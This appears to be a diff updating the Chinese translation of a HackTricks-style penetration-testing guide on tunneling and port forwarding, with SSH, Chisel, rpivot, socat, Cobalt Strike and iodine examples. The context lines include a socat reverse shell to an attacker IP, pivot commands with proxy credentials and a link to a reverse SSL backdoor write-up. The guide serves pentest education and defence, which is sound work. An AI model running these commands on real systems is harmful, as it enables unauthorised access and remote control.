@@ -1,15 +1,15 @@
-# 隧道和端口转发
+# Tunneling and Port Forwarding
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Nmap提示
+## Nmap tip
 
 > [!WARNING]
-> **ICMP** 和 **SYN** 扫描无法通过socks代理进行隧道传输，因此我们必须 **禁用ping发现** (`-Pn`) 并指定 **TCP扫描** (`-sT`) 以使其工作。
+> **ICMP** 和 **SYN** 扫描无法通过 socks 代理进行隧道传输，因此我们必须 **禁用 ping 发现** (`-Pn`) 并指定 **TCP 扫描** (`-sT`) 以使其工作。
 
 ## **Bash**
 
-**主机 -> 跳转 -> 内部A -> 内部B**
+**Host -> Jump -> InternalA -> InternalB**
 ```bash
 # On the jump server connect the port 3333 to the 5985
 mknod backpipe p;
@@ -31,9 +31,9 @@ SSH 图形连接 (X)
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
-### 本地端口到端口
+### Local Port2Port
 
-在 SSH 服务器中打开新端口 --> 其他端口
+在SSH服务器中打开新端口 --> 其他端口
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-您需要**在两个设备上都具有root权限**（因为您将要创建新的接口），并且sshd配置必须允许root登录：\
+您需要**在两个设备上具有 root 权限**（因为您将创建新的接口），并且 sshd 配置必须允许 root 登录：\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -152,14 +152,14 @@ rportfwd stop [bind port]
 ```
 需要注意：
 
-- Beacon 的反向端口转发旨在 **将流量隧道传输到团队服务器，而不是在单个机器之间中继**。
+- Beacon 的反向端口转发旨在 **将流量隧道传输到 Team Server，而不是在单个机器之间中继**。
 - 流量在 **Beacon 的 C2 流量中隧道传输**，包括 P2P 链接。
 - **不需要管理员权限** 来在高端口上创建反向端口转发。
 
 ### rPort2Port 本地
 
 > [!WARNING]
-> 在这种情况下，**端口在 beacon 主机上打开**，而不是在团队服务器上，**流量发送到 Cobalt Strike 客户端**（而不是团队服务器），然后从那里发送到指定的主机:端口。
+> 在这种情况下，**端口在 beacon 主机上打开**，而不是在 Team Server 上，**流量发送到 Cobalt Strike 客户端**（而不是 Team Server），然后从那里发送到指定的 host:port。
 ```
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -175,7 +175,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ## Chisel
 
 您可以从 [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) 的发布页面下载它。\
-您需要为客户端和服务器使用 **相同版本**。
+您需要为客户端和服务器使用 **相同的版本**。
 
 ### socks
 ```bash
@@ -246,7 +246,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-通过 **NTLM 代理** 进行中转
+通过 **NTLM 代理** 进行枢轴
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -272,7 +272,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
-### 通过socks进行Port2Port
+### 通过socks的Port2Port
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
@@ -290,6 +290,8 @@ victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
+[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
+
 ### SSL Socat Tunnel
 
 **/bin/sh console**
@@ -344,7 +346,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 您需要拥有**系统的 RDP 访问权限**。\
 下载：
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用 Windows 远程桌面服务功能中的 `Dynamic Virtual Channels` (`DVC`)。DVC 负责**在 RDP 连接上隧道数据包**。
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用 Windows 的远程桌面服务功能中的`Dynamic Virtual Channels`（`DVC`）。DVC 负责**在 RDP 连接上隧道数据包**。
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 在您的客户端计算机上加载**`SocksOverRDP-Plugin.dll`**，如下所示：
@@ -352,13 +354,13 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-现在我们可以通过 **RDP** 使用 **`mstsc.exe`** 连接到 **victim**，我们应该收到一个 **prompt**，提示 **SocksOverRDP plugin is enabled**，并且它将 **listen** 在 **127.0.0.1:1080**。
+现在我们可以通过 **RDP** 使用 **`mstsc.exe`** 连接到 **victim**，我们应该收到一个 **prompt**，提示 **SocksOverRDP 插件已启用**，并且它将 **listen** 在 **127.0.0.1:1080**。
 
 通过 **RDP** 连接并在受害者机器上上传并执行 `SocksOverRDP-Server.exe` 二进制文件：
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-现在在你的机器（攻击者）上确认端口 1080 正在监听：
+现在，在你的机器（攻击者）上确认端口 1080 正在监听：
 ```
 netstat -antb | findstr 1080
 ```
@@ -390,8 +392,8 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-现在，如果你在受害者的 **SSH** 服务上设置监听端口为 443。你可以通过攻击者的端口 2222 连接到它。\
-你也可以使用一个连接到 localhost:443 的 **meterpreter**，而攻击者在端口 2222 上监听。
+现在，如果你在受害者的**SSH**服务上设置监听端口为443。你可以通过攻击者的2222端口连接到它。\
+你也可以使用连接到localhost:443的**meterpreter**，而攻击者在2222端口监听。
 
 ## YARP
 
@@ -403,7 +405,7 @@ Tunnel 2222:<attackers_machine>:443
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-在两个系统中都需要 root 权限，以创建 tun 适配器并通过 DNS 查询在它们之间隧道数据。
+在两个系统中都需要root权限，以创建tun适配器并通过DNS查询在它们之间隧道数据。
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -440,7 +442,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### 更改 proxychains DNS
 
-Proxychains 拦截 `gethostbyname` libc 调用，并通过 socks 代理隧道 tcp DNS 请求。默认情况下，proxychains 使用的 DNS 服务器是 **4.2.2.2**（硬编码）。要更改它，请编辑文件： _/usr/lib/proxychains3/proxyresolv_ 并更改 IP。如果您在 **Windows 环境** 中，可以设置 **域控制器** 的 IP。
+Proxychains 拦截 `gethostbyname` libc 调用，并通过 socks 代理隧道 tcp DNS 请求。默认情况下，proxychains 使用的 DNS 服务器是 **4.2.2.2**（硬编码）。要更改它，请编辑文件： _/usr/lib/proxychains3/proxyresolv_ 并更改 IP。如果您在 **Windows 环境**中，可以设置 **域控制器** 的 IP。
 
 ## Go 中的隧道
 
@@ -477,13 +479,13 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-[**ngrok**](https://ngrok.com/) **是一个通过一条命令行将解决方案暴露到互联网的工具。**\
-&#xNAN;_&#x45;xposition URI 类似于：_ **UID.ngrok.io**
+[**ngrok**](https://ngrok.com/) **是一个可以通过一条命令行将解决方案暴露到互联网的工具。**\
+_&#x45;xposition URI 类似于:_ **UID.ngrok.io**
 
 ### 安装
 
-- 创建一个账户： https://ngrok.com/signup
-- 客户端下载：
+- 创建一个账户: https://ngrok.com/signup
+- 客户端下载:
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
 chmod a+x ./ngrok
